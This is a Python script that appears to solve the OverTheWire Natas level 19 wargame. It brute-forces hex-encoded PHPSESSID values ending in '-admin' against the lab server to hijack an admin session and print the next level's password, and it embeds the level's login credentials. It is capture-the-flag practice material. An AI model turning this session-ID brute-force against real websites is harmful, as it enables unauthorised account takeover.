
import requests

# data = {"username": "natas19", "password": "2334"}
auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
username = "-admin"
s_string = "".join("{}".format(hex(ord(c)), 'x') for c in username)

# while True:
# req = requests.post(
#     "http://natas19.natas.labs.overthewire.org/index.php", data=data, auth=auth)
# print(req.cookies.get_dict()["PHPSESSID"])

for i in range(1, 641):
    number = "".join("{}".format(hex(ord(c)), 'x') for c in str(i))
    s_id = number + s_string
    s_id = s_id.replace("0x", "")
    print(i)

    s = requests.Session()
    s.auth = auth
    req = s.get("http://natas19.natas.labs.overthewire.org/index.php",
                cookies={"PHPSESSID": s_id, "admin": "1"})

    if "You are an admin." in req.text:
        results = req.text.split()
        print(results[results.index("Password:") + 1])
        break
